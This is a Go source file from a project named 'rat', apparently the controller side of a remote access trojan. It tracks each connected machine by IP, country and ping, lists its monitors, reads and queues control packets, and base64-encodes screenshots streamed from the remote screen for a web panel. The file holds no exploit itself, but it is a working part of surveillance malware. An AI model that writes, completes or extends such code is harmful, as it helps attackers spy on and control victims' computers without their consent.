package main

import (
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"rat/shared"
	"rat/shared/network"
	"rat/shared/network/header"

	"strconv"
	"strings"
	"time"

	"golang.org/x/net/websocket"
)

type listenerMap map[header.PacketHeader]*websocket.Conn

type Monitor struct {
	ID     int `json:"id"`
	Width  int `json:"w"`
	Height int `json:"h"`
}

type Client struct {
	network.Writer
	network.Reader

	Conn net.Conn

	Id int

	shared.Computer
	Country     string
	CountryCode string

	Ping struct {
		Start    time.Time
		Current  int
		Received bool
	}

	Screen struct {
		Streaming bool
		New       bool
		Buffer    []byte
	}

	Queue chan OutgoingPacket

	Listeners listenerMap

	Monitors []shared.Monitor

	Authenticated bool
}

func NewClient(conn net.Conn) *Client {
	client := new(Client)

	client.Queue = make(chan OutgoingPacket)

	client.Id = int(rand.Int31())
	client.Computer = shared.Computer{}
	client.Conn = conn
	client.Reader = network.Reader{conn}
	client.Writer = network.Writer{conn}
	client.Country, client.CountryCode = GetCountry(client.GetIP())
	client.Listeners = make(map[header.PacketHeader]*websocket.Conn)
	client.Monitors = make([]shared.Monitor, 0)

	return client
}

func (c *Client) GetDisplayHost() string {
	return c.Conn.RemoteAddr().String()
}

func (c *Client) GetIP() string {
	return strings.Split(c.Conn.RemoteAddr().String(), ":")[0]
}

func (c *Client) GetFlagName() string {
	name := strings.ToLower(c.CountryCode)

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "local"
		default:
			name = "unknown"
		}
	}

	return name
}

func (c *Client) GetCountry() string {
	name := c.Country

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "Local Network"
		default:
			name = "Unknown"
		}
	}

	return name
}

func (c *Client) GetPing() string {
	return strconv.Itoa(c.Ping.Current) + " ms"
}

func (c *Client) GetPathSep() string {
	if c.Computer.OperatingSystemType == shared.Windows {
		return "\\"
	}

	return "/"
}

// PacketReader is the routine for continuously reading packets for this client
// Removes client on any read error, invalid packet header or deserializing error
func (c *Client) PacketReader() {
	for {
		var packet interface{}
		var err error

		header, err := c.ReadHeader()
		fmt.Println("Received header", header)
		if err != nil {
			goto err
		}

		packet = GetIncomingPacket(header)
		if packet == nil {
			err = errors.New("invalid header " + strconv.Itoa(int(header)))
			goto err
		}

		packet, err = c.Reader.ReadPacket(packet)
		if err != nil {
			goto err
		}

		err = packet.(IncomingPacket).OnReceive(c)
		if err != nil {
			goto err
		}

		continue

	err:
		fmt.Println("remove", err.Error())
		remove(c)
		break
	}
}

// Heartbeat pings the client and waits
func (c *Client) Heartbeat() {
	for {
		c.Queue <- &Ping{}

		for !c.Ping.Received {
			time.Sleep(time.Millisecond)
		}

		time.Sleep(time.Second * 2)
	}
}

// PacketQueue polls all packets added to the packet channel
// Will call Init() on each packet and write it
func (client *Client) PacketQueue() {
	for {
		packet := <-client.Queue
		packet.Init(client)
		client.WritePacket(packet)
	}
}

func (c *Client) ReadHeader() (header.PacketHeader, error) {
	var h header.PacketHeader
	err := binary.Read(c.Conn, shared.ByteOrder, &h)

	return h, err
}

func (c *Client) WriteHeader(header header.PacketHeader) error {
	return binary.Write(c.Conn, shared.ByteOrder, header)
}

func (c *Client) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())
	fmt.Println("Wrote header", packet.Header())

	if err != nil {
		return err
	}

	return c.Writer.WritePacket(packet)
}

// GetEncodedScreen returns a base64 encoded version of the most recent screenshot
func (c *Client) GetEncodedScreen() string {
	return base64.StdEncoding.EncodeToString(c.Screen.Buffer)
}

func (c *Client) GetClientData() ClientData {
	return ClientData{
		Ping:            c.Ping.Current,
		Country:         c.GetCountry(),
		Flag:            c.GetFlagName(),
		Host:            c.GetDisplayHost(),
		ComputerName:    c.Computer.GetDisplayName(),
		OperatingSystem: c.Computer.OperatingSystem,
	}
}
